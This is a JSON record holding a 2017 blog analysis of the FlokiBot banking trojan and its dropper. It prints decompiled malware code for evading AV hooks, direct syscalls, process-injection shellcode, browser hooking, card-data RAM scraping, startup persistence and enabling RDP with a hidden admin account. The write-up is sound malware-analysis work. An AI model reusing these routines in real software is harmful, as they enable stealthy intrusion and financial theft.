{
    "id": "663ccf6b-5dce-4491-b28d-36f8639f58aa",
    "created_at": "2023-01-12T15:10:17.171881Z",
    "updated_at": "2025-03-27T02:16:58.10867Z",
    "deleted_at": null,
    "sha1_hash": "2806d27461980e9a13fc13b698db66561ef4be00",
    "title": "2017-03-14 - Analyzing and Deobfuscating FlokiBot Banking Trojan",
    "authors": "",
    "file_creation_date": "2022-05-27T23:17:02Z",
    "file_modification_date": "2022-05-27T23:17:02Z",
    "file_size": 449935,
    "plain_text": "# Analyzing and Deobfuscating FlokiBot Banking Trojan\n\n**adelmas.com/blog/flokibot.php**\n\n#### 14/03/2017\n\n## Introduction\n\n#### FlokiBot is a recent banking trojan targeting Europe and Brasil, sold as a malware kit for $1000 on some hacking forums. It is being spread via spam and exploit kits. Even though it is based on ZeuS, FlokiBot shows a lot of interesting improvements, new features like RAM scraping, a custom dropper, and seems to have borrowed some lines of code from the Carberp leak.\n\n FlokiBot and its dropper have many both standard and uncommon obfuscation techniques, we will focus on demystifying them and showing how to deobfuscate them statically using IDA and IDAPython scripts. Since you find most of these techniques in a lot of recent malwares, I think it's a good exercise.\n\n I decided to take a look at FlokiBot after reading about its dropper in this nice article by @hasherezade : https://blog.malwarebytes.com/threat-analysis/2016/11/floki-bot-and-the- stealthy-dropper/. While most articles on FlokiBot focus on its dropper, I will also try to get into a bit more details and talk about the FlokiBot payload ; we will see that it has some interesting features and is not your usual ZeuS rip-off, even though most of the code comes from the ZeuS and the Carberp leaks. Still better than reversing ransomware anyway.\n\n Hashes :\n```\n$ rahash2 -a md5,sha1,sha256 -qq floki_dropper.vir \n37768af89b093b96ab7671456de894bc\n5ae4f380324ce93243504092592c7b275420a338\n4bdd8bbdab3021d1d8cc23c388db83f1673bdab44288fccae932660eb11aec2a\n$ rahash2 -a md5,sha1,sha256 -qq floki_payload32.vir\nda4ea4e44ea3bb65e254b02b2cbc67e8\ne8542a465810ff1396a316d1c46e96e042bf4189\n9f1d2d251f693787dfc0ba8e64907e204f3cf2c7320f66007106caac0424a1f3\n\n Automated analysis of the dropper :\n\n VirusTotal Analysis, Hybrid-Analysis\n\n## FlokiBot Dropper\n\n### Imports : Module / API Hashing & Syscalls\n\n```\n\n-----\n\n#### The dropper loads its modules by hashing library names and comparing them with hardcoded hashes. The hashing process consists in a basic CRC32 that is then XORed with a two bytes key, different for each sample. Two methods were implemented to retrieve dll names : using the Process Environment Block to go through the InMemoryOrderModuleList struct and reading the BaseDllName field in order to get the names of the dll already loaded by the process, and by listing libraries in the Windows system folder.\n\n The following modules were imported by the dropper :\n```\nCRC  Library  Method\n-----------------------------------------------------84C06AAD ntdll.dll  load_imports_peb\n6AE6ABEF kernel32.dll  load_imports_peb\n2C2B3C88\n948B9CAB\nC7F4511A wininet.dll  load_imports_folder\nF734DCF8 ws2_32.dll  load_imports_folder\nF16EE30D advapi32.dll  load_imports_folder\nC8A18E35 shell32.dll  load_imports_folder\nE20BF2CB shlwapi.dll  load_imports_folder\n1A50B19C secur32.dll  load_imports_folder\n630A1C77 crypt32.dll  load_imports_folder\n0248AE46 user32.dll  load_imports_peb\nBD00960A\n4FF44795 gdi32.dll  load_imports_peb\nE069944C ole32.dll  load_imports_folder\nCAAD3C25\n\n```\n\n-----\n\n#### Then, FlokiBot does the exact same routine to locate and load which API it needs in those modules. First, it retrieves the address of LdrGetProcedureAddress in ntdll and uses it to get a handle to other API when the CRC of the names match. By doing so, only addresses of functions are visible to a debugger, making the analysis of the code pretty tough since we are not able to see which API are being called. A way to deobfuscate this is shown below, in the next part.\n\n Another interesting thing by FlokiBot and the dropper is the way they call some functions of the native API. These functions are located in ntdll and have Nt* or Zw* prefixes. They are a bit different than other API in their implementation, as they make use of syscalls and more particularly the int 0x2e . The following screenshot shows how they are implemented in ntdll :\n\n As we can see, the syscall value is put in eax (0x15 for NtAllocateVirtualMemory on my Windows 7 64-bit) and arguments are passed through edx . A full list of those syscall numbers for x86 and 64-bit Windows can be found on this page : http://j00ru.vexillium.org/ntapi/.\n\n While going through all API in ntdll, FlokiBot will check if the first opcode of the function is\n```\n0xB8 = MOV EAX, . When it is the case and the CRC of the API name matches, it will\n\n extract the 4 bytes following the MOV EAX, corresponding to the syscall number and store it in an array we call dwSyscallArray .\n\n```\n\n-----\n\n#### Here is what dwSyscallArray looked like on my VM, after all the syscall numbers were extracted by the dropper :\n```\nIndex API  Syscall number\n------------------------------------------------------0x0  NtCreateSection  0x47\n0x1  NtMapViewOfSection  0x25\n0x2  NtAllocateVirtualMemory  0x15\n0x3  NtWriteVirtualMemory  0x37\n0x4  NtProtectVirtualMemory  0x4D\n0x5  NtResumeThread  0x4F\n0x6  NtOpenProcess  0x23\n0x7  NtDuplicateObject  0x39\n0x8  NtUnmapViewOfSection  0x27\n\n Whenever FlokiBot needs to call one of these native functions, it will call its own functions that directly retrieve the syscall number from the dwSyscallArray, pass arguments and trigger the interrupt 0x2E the same way it is implemented in ntdll. This is why you won't see any call traces of these API and monitoring tools that hook them will be unable to monitor the calls.\n\n### Deobfuscating API Calls\n\n#### Since the same functions and structures are used in the FlokiBot payload, you can refer to the \"Full static deobfuscation with IDAPython\" part below and easily adapt the provided IDAPython script to deobfuscate API calls in the dropper.\n\n### Unhooking modules\n\n#### An interesting feature of FlokiBot is that both the dropper and the payloads have an unhooking routine. The idea is to uninstall hooks written by monitoring tools, sandboxes and AV. Even though this is not the first time a malware uses such a feature, Carberp had one to hide from Trusteer Rapport and Carbanak more recently for example, it is pretty rare and worth noticing. In this part I will describe how FlokiBot performs unhooking.\n\n First, FlokiBot gets a handle to the ntdll.dll file on disk by listing dlls in System32 folder and using the hashing process we explained above, and maps it in memory by calling\nMapViewOfFile . As a result, FlokiBot has two versions of the lib mapped in its memory :\n\n the one it imported during the importing phase and that monitoring tools may have altered with hooks, and the one it just mapped directly from disk which is clean.\n\n NTDLL mapped from disk - Clean version\n\n```\n\n-----\n\n#### NTDLL imported by the dropper - Potentially hooked\n\n Now that the correct permissions are set, FlokiBot pushes the address of the code section of the mapped clean DLL and the imported one and calls its unhooking routine.\n\n Since it needs to overwrite some data in its memory to delete the hooks, the malware has to change memory protections of the imported NTDLL code export section. It does so by calling\n```\nNtProtectVirtualMemory with an int 0x2E and the corresponding syscall it previously\n\n extracted ( 0x4D on my version of Windows). We can see that a part of the code section becomes writable if a hook is spotted :\n\n The unhooking function can be described with these three steps : For each exported function in NTDLL...\n\n Comparing the first opcodes of the two mapped lib If they differ, it means the function in the imported ntdll was hooked Changing memory protections of the imported dll to writable Patching the opcodes with the ones copied form the DLL mapped from disk\n\n```\n\n-----\n\n#### The main part of the routine is shown below :\n\n As a consequence, most monitoring tools, AV and sandboxes will fail to keep track of the malware calls. This is particularly useful if you want to avoid automated analysis from online sandboxes like malwr.com.\n\n### Extracting Bots from Resources\n\n#### The dropper has 3 resources with explicit names : key, bot32 and bot64 . Bots are compressed with RtlCompressBuffer() and LZNT1, and encrypted with RC4 using the 16 bytes key key . For my sample, the key is :\n```\nA3 40 75 AD 2E C4 30 23 82 95 4C 89 A4 A7 84 00\n\n You can find a Python script to dump the payloads and their config on the Talos Group Github here : https://github.com/vrtadmin/flokibot. Note that they don't execute properly on their own since they are supposed to be injected in a process and need some data written in memory by the dropper. We will describe this injection in the next part.\n\n Resources are extracted the usual way :\n\n```\n\n-----\n\n```\nBOOL __userpurge extract_bot_from_rsrc@<eax>(int a1@<edi>, HMODULE hModule)\n{\n HRSRC v2; // eax@1\n int v3; // eax@2\n const void *v4; // esi@5\n HRSRC v5; // eax@7\n int v6; // eax@8\n HRSRC v7; // eax@10\n unsigned int v8; // eax@11\n int v10; // [sp+4h] [bp-4h]@1\n v10 = 0;\n v2 = FindResourceW(hModule, L\"key\", (LPCWSTR)0xA);\n if ( v2 )\n  v3 = extract_rsrc(hModule, (int)&v10, v2);\n else\n  v3 = 0;\n if ( v3 )\n {\n  v4 = (const void *)v10;\n  if ( v10 )\n  {\n   qmemcpy((void *)(a1 + 84), (const void *)v10, 0x10u);\n   free_heap(v4);\n  }\n }\n v5 = FindResourceW(hModule, L\"bot32\", (LPCWSTR)0xA);\n if ( v5 )\n  v6 = extract_rsrc(hModule, a1 + 4, v5);\n else\n  v6 = 0;\n *(_DWORD *)(a1 + 12) = v6;\n v7 = FindResourceW(hModule, L\"bot64\", (LPCWSTR)0xA);\n if ( v7 )\n  v8 = extract_rsrc(hModule, a1 + 8, v7);\n else\n  v8 = 0;\n *(_DWORD *)(a1 + 16) = v8;\n return *(_DWORD *)(a1 + 4) && *(_DWORD *)(a1 + 12) > 0u && *(_DWORD *)(a1 + 8) &&\nv8 > 0;\n}\n\n### Process Injection\n\n#### The dropper doesn't inject its payload into explorer.exe (or svchost.exe if it fails) the usual way, with NtMapViewOfSection and NtWriteVirtualMemory . Instead, it writes and executes a shellcode that will decrypt and decompress the payload inside the process memory. That's unusual and interesting. The dropping process is summed up by this picture by Talos Intelligence :\n\n```\n\n-----\n\n#### http://blog.talosintelligence.com/2016/12/flokibot-collab.html\n 1. The Dropper writes a trampoline shellcode and one of its own function in\n```\n   explorer.exe / svchost.exe\n\n 2. When executed, this trampoline will call the function 3. This function was written to run on its own and dynamically resolve imports, read the\n resources of the dropper and extract them in its process memory (ie. inside the address space of explorer.exe / svchost.exe ) 4. Finally, the Dropper executes the entrypoint of the bot payload in the target process\n\n The first shellcode written in explorer.exe (called trampoline) will sleep for 100 ms. and then call a function that the dropper mapped in the process memory at 0x80000000, called\nsub_405E18 by default in the dropper. This second stage is the one responsible of\n\n extracting the bot payloads, decrypting and uncompressing them. All this happens in\nexplorer.exe / svchost.exe memory.\n\n```\n\n-----\n\n```\n$ rasm2 a x86 b 32 D\n'558BEC51C745FCFF10B4766864000000FF55FCC745FC000008006800000900FF55FC83C4048BE55DC3'\n0x00000000  1            55 push ebp\n0x00000001  2           8bec mov ebp, esp\n0x00000003  1            51 push ecx\n0x00000004  7      c745fcff10b476 mov dword [ebp - 4], 0x76b410ff ; address of\nsleep()\n0x0000000b  5        6864000000 push 0x64\n0x00000010  3          ff55fc call dword [ebp - 4] ; sleep()\n0x00000013  7      c745fc00000800 mov dword [ebp - 4], 0x80000\n0x0000001a  5        6800000900 push 0x90000\n0x0000001f  3          ff55fc call dword [ebp - 4] ; sub_405E18, 2nd stage\n0x00000022  3          83c404 add esp, 4\n0x00000025  2           8be5 mov esp, ebp\n0x00000027  1            5d pop ebp\n0x00000028  1            c3 ret\nsub_405E18 will resolve its imports by the same process as the dropper and the payload,\n\n#### using a slightly different crc32 and a new XOR key.\n\n```\n\n-----\n\n```\nint __stdcall sub_405E18(int a1)\n{\n [...]\n if ( a1 && *(_DWORD *)(a1 + 4) && *(_DWORD *)a1 != -1 )\n {\n  v1 = 0;\n  v34 = 0i64;\n  v35 = 0i64;\n  v36 = 0i64;\n  do /* CRC Polynoms */\n  {\n   v2 = v1 >> 1;\n   if ( v1 & 1 )\n    v2 ^= 0xEDB88320;\n   if ( v2 & 1 )\n    v3 = (v2 >> 1) ^ 0xEDB88320;\n   else\n    v3 = v2 >> 1;\n   [...]\n   if ( v8 & 1 )\n    v9 = (v8 >> 1) ^ 0xEDB88320;\n   else\n    v9 = v8 >> 1;\n   v40[v1++] = v9;\n  }\n  while ( v1 < 0x100 );\n  v10 = shellcode_imp_dll((int)v40, 0x6AE6AF84);\n  v11 = shellcode_imp_dll((int)v40, 0x84C06EC6);\n  v30 = v12;\n  v13 = v11;\n  LODWORD(v34) = shellcode_imp_api(v10, (int)v40, 0x9CE3DCC);\n  DWORD1(v34) = shellcode_imp_api(v10, (int)v40, 0xDF2761CD);\n  DWORD2(v34) = shellcode_imp_api(v10, (int)v40, 0xF7C79EC4);\n  LODWORD(v35) = shellcode_imp_api(v10, (int)v40, 0xCD53C55B);\n  DWORD1(v36) = shellcode_imp_api(v10, (int)v40, 0xC97C2F79);\n  LODWORD(v36) = shellcode_imp_api(v10, (int)v40, 0x3FC18D0B);\n  DWORD2(v36) = shellcode_imp_api(v13, (int)v40, 0xD09F7D6);\n  DWORD1(v35) = shellcode_imp_api(v13, (int)v40, 0x9EEE7B06);\n  DWORD2(v35) = shellcode_imp_api(v13, (int)v40, 0xA4160E3A);\n  DWORD3(v35) = shellcode_imp_api(v13, (int)v40, 0x90480F70);\n  DWORD3(v36) = shellcode_imp_api(v13, (int)v40, 0x52FE165E);\n  v14 = ((int (__stdcall *)(_DWORD, _DWORD, signed int, signed int))v34)(0, *\n(_DWORD *)(a1 + 8), 0x3000, 64);\n  [...]\n}\n\n#### The first hashes, 0x6AE6AF84 and 0x84C06EC6, are most probably the hashes of 'kernel32.dll' and 'ntdll.dll'. I implemented the hashing process in Python, verified that the two imported DLL are indeed kernel32 and ntdll, and adapted my Python script to parse their\n\n```\n\n-----\n\n#### export table and try to resolve the API names the function is importing. I ran the script and got the following API :\n```\nPython>run\n[+] kernel32.dll (6AE6AF84) : Parsing...\n0x09CE3DCC --> VirtualAlloc\n0xDF2761CD --> OpenProcess\n0xF7C79EC4 --> ReadProcessMemory\n0xCD53C55B --> VirtualFree\n0xC97C2F79 --> GetProcAddress\n0x3FC18D0B --> LoadLibraryA\n[+] ntdll.dll (84C06EC6) : Parsing...\n0x0D09F7D6 --> NtClose\n0x9EEE7B06 --> NtCreateSection\n0xA4160E3A --> NtMapViewOfSection\n0x90480F70 --> NtUnmapViewOfSection\n0x52FE165E --> RtlDecompressBuffer\n\n With these functions, the code inside the process is able to read the resources (bots & RC4 key) of the dropper and map the payload in memory. Finally, the context of the suspended remote thread is modified so that its EIP points on the first shellcode, and the thread is resumed.\n\n```\n\n-----\n\n### Execution Flow Graph\n\n## FlokiBot Payload\n\n#### The payload is based on the well-known and already analyzed ZeuS trojan so I won't detail everything. As for the dropper, I will focus on the deobfuscating parts and the improvements implemented in FlokiBot.\n\n### Config\n\n#### I ran the ConfigDump.py script that the Talos team released and got the following C&C :\n```\n$ python ConfigDump.py payload_32.vir \nSuccessfully dumped config.bin.\nURL: https://extensivee[.]bid/000L7bo11Nq36ou9cfjfb0rDZ17E7ULo_4agents/gate[.]php\n\n### Full static deobfuscation with IDAPython\n\n```\n\n-----\n\n#### Identifying functions\n\n First, we notice some important functions of the payload being reused from the dropper. Producing a Rizzo signature of the dropper and loading it in the payload allow IDA to identify and rename quite a few functions.\n\n Static deobfuscation of API calls and hooks\n\n The idea is to reimplement the hashing process in Python, hash all API exported by the DLL FlokiBot loads, and then compare them with the hashes we collected in the code. If there is a match, we use IDAPython to rename the function, making the disassembly more and more readable. The payload uses the same CRC function and the same XOR key, so the script will work for both of them.\n\n Strings deobfuscation\n\n Most of the interesting strings are encrypted using a XOR with their own one-byte key, which is similar to what ZeuS or Fobber (Tinba evolution) used. The malware stores an array of all\n```\nENCRYPTED_STRING structures and deobfuscates them on-the-fly by their index. An\n\n encrypted string is represented by the following structure :\n\n```\n\n-----\n\n```\ntypedef struct {\n char xor_key;\n WORD size;\n void* strEncrypted;\n} ENCRYPTED_STRING;\n\n#### First, I ran a short script to list how parameters of decrypt_string were pushed on the stack to figure out how to retrieve them without errors.\n\n After running our script, here is an example of how the disassembly looks in IDA :\n\n Full IDAPython script\n\n Here is the full Python script I wrote to deobfuscate the payload : https://gist.github.com/adelmas/8c864315648a21ddabbd6bc7e0b64119.\n\n It is based on IDAPython and PeFile. It was designed for static analysis, you don't have to start any debugger for the script to work. It does the following :\n\n Identifies all functions imported by the bot and rename them [API name]_wrap Parses the WINAPIHOOK structure and renames the hook functions hook_[API\n\n```\n```\nname]\n\n```\n\n-----\n\n#### Decrypts strings and put their decrypted values in comments where the\n```\n   decrypt_string function is called\n\n### Persistence\n\n#### The bot copies itself to C:\\Documents and Settings\\[username]\\Application Data under a pseudo-random name and achieves Persistence by creating a .lnk in the Windows startup folder.\nint startup_lnk() {\n int v0; // edi@1\n _WORD *v1; // ecx@1\n int v2; // eax@2\n _WORD *v3; // ecx@2\n const void *v4; // eax@2\n const void *v5; // esi@3\n int strStartupFolder; // [sp+8h] [bp-20Ch]@1\n int v8; // [sp+210h] [bp-4h]@6\n v0 = 0;\n SHGetFolderPathW_wrap(0, 7, 0, 0, &strStartupFolder); // 7 = CSIDL_STARTUP\n v1 = (_WORD *)PathFindFileNameW_wrap(&pFilename);\n if ( v1 && (v2 = cstm_strlen(v1), sub_40FECB(v2 - 4, v3), v4) )\n  v5 = v4;\n else\n  v5 = 0;\n if ( v5 ) {\n  v8 = 0;\n  if ( build_lnk((int)&v8, (const char *)L\"%s\\\\%s.lnk\", &strStartupFolder, v5) > 0\n)\n   v0 = v8;\n  cstm_FreeHeap(v5);\n }\n return v0;\n}\n\n### API Hooking\n\n#### Overview\n\n Based on ZeuS, FlokiBot uses the same kind of structure array to store its hooks, with a slightly different structure :\ntypedef struct\n{\n void *functionForHook;\n void *hookerFunction;\n void *originalFunction;\n DWORD originalFunctionSize;\n DWORD dllHash;\n DWORD apiHash;\n} HOOKWINAPI;\n\n```\n\n-----\n\n#### After we ran the previous script to deobfuscate API calls and after we located the address of the hook structure array, we could easily parse it with another small IDA script to identify and name the hook functions ( hook_* ). We end up with the following table :\n\n\n-----\n\n```\nParsing hook table @ 0x41B000...\nOriginal Function Hooked     Hooker Function             DLL Hash  \nAPI Hash\n-----------------------------------------------------------------------------------------------------------NtProtectVirtualMemory_wrap    hook_NtProtectVirtualMemory_wrap    84C06AAD\n(ntdll)   5C2D2E7A\nNtResumeThread_wrap        hook_NtResumeThread_wrap        84C06AAD\n(ntdll)   6273819F\nLdrLoadDll_wrap          hook_LdrLoadDll_wrap          84C06AAD\n(ntdll)   18364D1F\nNtQueryVirtualMemory_wrap     hook_NtQueryVirtualMemory_wrap     84C06AAD\n(ntdll)   03F6C761\nNtFreeVirtualMemory_wrap     hook_NtFreeVirtualMemory_wrap      84C06AAD\n(ntdll)   E9D6FAB3\nNtAllocateVirtualMemory_wrap   hook_NtAllocateVirtualMemory_wrap    84C06AAD\n(ntdll)   E0761B06\nHttpSendRequestW_wrap       hook_HttpSendRequestW_wrap       C7F4511A\n(wininet)  0BD4304A\nHttpSendRequestA_wrap       hook_HttpSendRequestA_wrap       C7F4511A\n(wininet)  FF00851B\nHttpSendRequestExW_wrap      hook_HttpSendRequestExW_wrap      C7F4511A\n(wininet)  AAB98346\nHttpSendRequestExA_wrap      hook_HttpSendRequestExA_wrap      C7F4511A\n(wininet)  5E6D3617\nInternetCloseHandle_wrap     hook_InternetCloseHandle_wrap      C7F4511A\n(wininet)  E51929C9\nInternetReadFile_wrap       hook_InternetReadFile_wrap       C7F4511A\n(wininet)  6CC0AC18\nInternetReadFileExA_wrap     hook_InternetReadFileExA_wrap      C7F4511A\n(wininet)  FEDE53D9\nInternetQueryDataAvailable_wrap  hook_InternetQueryDataAvailable_wrap  C7F4511A\n(wininet)  1AF94509\nHttpQueryInfoA_wrap        hook_HttpQueryInfoA_wrap        C7F4511A\n(wininet)  02B5094B\nclosesocket_wrap         hook_closesocket_wrap          F734DCF8\n(ws2_32)   A5C6E39A\nsend_wrap             hook_send_wrap             F734DCF8\n(ws2_32)   A7730E20\nWSASend_wrap           hook_WSASend_wrap            F734DCF8\n(ws2_32)   B2927DE5\nTranslateMessage_wrap       hook_TranslateMessage_wrap       0248AE46\n(user32)   5DD9FAF9\nGetClipboardData_wrap       hook_GetClipboardData_wrap       0248AE46\n(user32)   1DCBE5AA\nPFXImportCertStore_wrap      hook_PFXImportCertStore_wrap      1A50B19C\n(secur32)  E0991FE4\nPR_OpenTCPSocket_wrap       hook_PR_OpenTCPSocket_wrap       948B9CAB\n(nss3)    3B8AA62A\nPR_Close_wrap           hook_PR_Close_wrap           948B9CAB\n(nss3)    6D740323\nPR_Read_wrap           hook_PR_Read_wrap            948B9CAB\n(nss3)    5C9DC287\n\n```\n\n-----\n\n```\nPR_Write_wrap           hook_PR_Write_wrap           948B9CAB\n(nss3)    031EF8B8\n\n#### Most of them are standard hooks installed by ZeuS and most banking malwares. Though, we can notice some interesting new hooks on NtFreeVirtualMemory and\nNtProtectVirtualMemory . We will see their uses in the next parts.\n\n Man-in-the-Browser\n\n Floki implements Man-in-the-Browser attacks by injecting itself into Firefox and Chrome process and intercepting LdrLoadDll . If the hash of the DLL that is being loaded by the browser matches with either hash of nss3.dll, nspr4.dll or chrome.dll, API hooks are installed accordingly allowing the malware to perform Form grabbing and Webinjects.\n\n```\n\n-----\n\n```\nint __stdcall hook_LdrLoadDll_wrap(int PathToFile, int Flags, int ModuleFileName, int\n*ModuleHandle)\n{\n int result; // eax@2\n int filename_len; // eax@8\n int dll_hash; // eax@8\n[...]\n if ( cstm_WaitForSingleObject() ) {\n  v5 = LdrGetDllHandle_wrap(PathToFile, 0, ModuleFileName, ModuleHandle);\n  v6 = LdrLoadDll_wrap(PathToFile, Flags, ModuleFileName, ModuleHandle);\n  v12 = v6;\n  if ( v5 < 0 && v6 >= 0 && ModuleHandle && *ModuleHandle && ModuleFileName )\n  {\n   RtlEnterCriticalSection_wrap(&unk_41D9F4);\n   filename_len = cstm_strlen(*(_WORD **)(ModuleFileName + 4));\n   dll_hash = hash_filename(filename_len, v8);\n   if ( !(dword_41DA0C & 1) ) {\n    if ( dll_hash == 0x2C2B3C88 || dll_hash == 0x948B9CAB ) { // hash nss3.dll &\nnspr4.dll\n     sub_416DBD(*ModuleHandle, dll_hash);\n     if ( dword_41DC2C )\n      v11 = setNspr4Hooks(v10, dword_41DC2C);\n    }\n    else if ( dll_hash == 0xCAAD3C25 ) {   // hash chrome.dll\n     if ( byte_41B2CC ) {\n      if ( setChromeHooks() )\n       dword_41DA0C |= 2u;\n     }\n[...]\n }\n else\n {\n  result = LdrLoadDll_wrap(PathToFile, Flags, ModuleFileName, ModuleHandle);\n }\n return result;\n}\n\n#### Man-in-the-Browser in Internet Explorer is trivially done by Wininet API Hooking (see functions above). Chrome Webinjects are not implemented yet.\n\n Process injection\n\n The malware hooks NtResumeThread API to inject its shellcode and its payload in other child process.\n\n```\n\n-----\n\n```\nint __userpurge hook_NtResumeThread_wrap@<eax>(int a1@<ebx>, int a2, int a3)\n{\n int result; // eax@2\n [...]\n if ( cstm_WaitForSingleObject() ) {\n  cstm_memset(&v18, 0, 0x1Cu);\n  v20 = v4;\n  if ( NtQueryInformationThread_wrap(a2, 0, &v18, v4, &v20, a1) >= 0 ) {\n   v5 = v19;\n   if ( v19 ) {\n    v23 = mutex(v19);\n    if ( v23 ) {\n     v6 = OpenProcess_wrap(1144, 0, v5);\n     if ( v6 ) {\n      v22 = 0;\n      v7 = dupl_handle(v6, v23, 0, &v22);\n      v21 = v7;\n      if ( v7 ) {\n       if ( (v8 = (char *)sub_409741 + v7 - dword_41DFE8,\n          v24 = (int (__thiscall *)(void *, int))((char *)sub_409741 + v7 dword_41DFE8),\n          v15 = 65539,\n          !GetThreadContext_wrap(a2, &v15))\n        || v17 != RtlUserThreadStart_wrap && RtlUserThreadStart_wrap\n        || (v16 = v8,\n          v15 = 0x10002,\n          v25 = 0x51EC8B55,      // Shellcode\n          v26 = 0xFC45C7,\n          v27 = 0x68000000,\n          v28 = 0,\n          v29 = 0xC7FC55FF,\n          v30 = 0xFC45,\n          v31 = 0x680000,\n          v32 = 0xFF000000,\n          v33 = 0xC483FC55,\n          v34 = 4,\n          v35 = 0xC35DE58B,\n          cstm_memcpy((char *)&v26 + 3, &Sleep_wrap, 4u),\n          cstm_memcpy((char *)&v30 + 2, &v24, v9),\n          cstm_memcpy((char *)&v31 + 3, &v22, v10),\n          v24 = (int (__thiscall *)(void *, int))100,\n          cstm_memcpy(&v28, &v24, v11),\n          (v14 = VirtualAllocEx_wrap(v13, v12, v6, 0, 41, 0x3000, 64)) ==\n0)\n        || (WriteProcessMemory_wrap(v6, v14, &v25, 41, 0), v16 = (char *)v14,\n!SetThreadContext_wrap(a2, &v15)) )\n       {\n        VirtualFreeEx_wrap(v6, v21, 0, 0x8000);\n       }\n      }\n      NtClose_wrap(v6);\n     }\n     NtClose_wrap(v23);\n    }\n\n```\n\n-----\n\n```\n   }\n  }\n  result = NtResumeThread_wrap(a2);\n }\n else\n {\n  result = NtResumeThread_wrap(a2);\n }\n return result;\n}\n\n#### Certificate stealing\n\n FlokiBot is able to steal digital certificates by hooking PFXImportCertStore, using the same code as ZeuS and Carberp.\n\n Protecting hooks\n\n Floki protects its hooks by putting a hook and filtering calls on NtProtectVirtualMemory to prevent tools like AV from restoring the original functions. Whenever a program tries to change memory protections of a process Floki is injected into, the malware will block the call and returns a STATUS_ACCESS_DENIED .\n\n```\n\n-----\n\n```\nunsigned int __stdcall hook_NtProtectVirtualMemory_wrap(void ProcessHandle, int\n*BaseAddress, int NumberOfBytesToProtect, int NewAccessProtection, int\nOldAccessProtection)\n{\n int retBaseAddress; // [sp+18h] [bp+Ch]@7\n[...]\n v11 = 0;\n v5 = BaseAddress;\n if ( cstm_WaitForSingleObject() && BaseAddress && ProcessHandle ==\nGetCurrentProcess() )\n {\n  if ( check_base_addr(*BaseAddress) )\n   return 0xC0000022;            // STATUS_ACCESS_DENIED\n  RtlEnterCriticalSection_wrap(&unk_41E6E8);\n  v11 = 1;\n }\n retBaseAddress = NtProtectVirtualMemory_wrap(\n          ProcessHandle,\n          BaseAddress,\n          NumberOfBytesToProtect,\n          NewAccessProtection,\n          OldAccessProtection);\n[...]\nLABEL_18:\n if ( v11 )\n  RtlLeaveCriticalSection_wrap(&unk_41E6E8);\n return retBaseAddress;\n}\n\n### PoS malware feature : RAM Scraping\n\n#### In my previous article, I reversed a very basic PoS malware called TreasureHunter that uses RAM scraping as its main way to steal PAN.\n\n Like most PoS malwares, FlokiBot searches for track2 PAN by reading process memory regularly. Obviously, this isn't very efficient since you can't constantly monitor the memory, you will miss on a lot of potential PAN in between scans. To overcome this issue, after Floki injected itself into a process, it will also puts a hook on NtFreeVirtualMemory so that it looks for track2 PAN whenever the process wants to free a chunk of memory and before it is actually freed. This way, it is far likely to miss PAN.\n\n```\n\n-----\n\n```\nint __stdcall hook_NtFreeVirtualMemory_wrap(HANDLE ProcessHandle, PVOID BaseAddress,\nPSIZE_T RegionSize, ULONG FreeType)\n{\n PVOID v4; // ebx@1\n int v5; // edi@3\n RtlEnterCriticalSection_wrap(&unk_41E6E8);\n v4 = 0;\n if ( BaseAddress )\n  v4 = *BaseAddress;\n v5 = NtFreeVirtualMemory_wrap(ProcessHandle, BaseAddress, RegionSize, FreeType);\n if ( v5 >= 0 && !dword_41E6A8 && ProcessHandle == (HANDLE)-1 &&\ncstm_WaitForSingleObject() )\n  trigger_ram_scraping((int)v4);\n RtlLeaveCriticalSection_wrap(&unk_41E6E8);\n return v5;\n}\n\n#### When it finds track2 data, Floki will try to identify issuers by looking at the beginning of the PAN. A full list of Issuer Identification Number can be found on this very informative page : http://www.stevemorse.org/ssn/List_of_Bank_Identification_Numbers.html. Floki doesn't look at the whole IIN (6 digits) but only checks the first digit and see if it matches with those issuers :\n\n 3 : Amex / Dinners / JP 4 : VISA 5 : Mastercard 6 : Discover\n\n FlokiBot identify_mii routine :\n\n```\n\n-----\n\n#### Then, it checks if the PAN is valid according to the Luhn algorithm :\n```\nchar __usercall check_mii_luhn@<al>(void *a1@<ecx>, _BYTE *a2@<esi>)\n{\n char result; // al@1\n [...]\n result = identify_mii(*a2, a1);\n if ( result )\n {\n  v7 = 0;  v3 = 1;  v8 = 2;\n  v9 = 4;  v10 = 6;  v11 = 8;\n  v12 = 1;  v13 = 3;  v14 = 5;\n  v15 = 7;  v16 = 9;  v4 = 0;  v5 = 16;\n  do  // Luhn Algorithm\n  {\n   v6 = a2[--v5] - '0';\n   if ( !v3 )\n    v6 = *(&v7 + v6);\n   v4 += v6;\n   v3 = v3 == 0;\n  }\n  while ( v5 );\n  result = v4 % 10 == 0;\n }\n return result;\n}\n\n### Communications\n\n#### Communications are encrypted with a mix of RC4 and XOR. Our string deobfuscation script helps identify the followind explicitly-named commands :\n\n```\n\n-----\n\n```\nuser_flashplayer_remove\nuser_flashplayer_get\nuser_homepage_set\nuser_url_unblock\nuser_url_block\nuser_certs_remove\nuser_certs_get\nuser_cookies_remove\nuser_cookies_get\nuser_execute\nuser_logoff\nuser_destroy\nfs_search_remove\nfs_search_add\nfs_path_get\nbot_ddos_stop\nbot_ddos_start\nbot_httpinject_enable\nbot_httpinject_disable\nbot_bc_remove\nbot_bc_add\nbot_update_exe\nbot_update\nbot_uninstall\nos_reboot\nos_shutdown\n\n#### FlokiBot doesn't support TOR yet, but you can find some traces of this feature in the code.\n\n### RDP Activation\n\n#### The payload tries to activate the remote desktop feature of Windows manually through the registry, and executes a console command to add a hidden administrator account\ntest_account:test_password .\n\n```\n\n-----\n\n#### Pseudocode of the enable_remote_desktop function :\n\n\n-----\n\n```\nvoid enable_remote_desktop()\n{\n signed int v0; // eax@3\n int v1; // [sp+0h] [bp-Ch]@2\n int v2; // [sp+4h] [bp-8h]@2\n int v3; // [sp+8h] [bp-4h]@2\n if ( byte_41E43C ) {\n  v2 = 0;\n  v1 = 4;\n  v3 = 0x80000002;\n  if ( RegOpenKeyExW_wrap(0x80000002,\nL\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\", 0, 1, &v3) )\n   v0 = -1;\n  else\n   v0 = cstm_RegQueryValueExW(&v3, (int)L\"fDenyTSConnections\", (int)&v1, (int)&v2,\n4);\n  if ( v0 != -1 ) {\n   if ( v2 ) {\n    v3 = 0;                 // 0 = Enables remote desktop\nconnections\n    cstm_RegSetValueExW(\n     0x80000002,\n     (int)L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\",\n     (int)L\"fDenyTSConnections\",\n     4,\n     (int)&v3,\n     4);\n   }\n  }\n }\n}\n\n#### 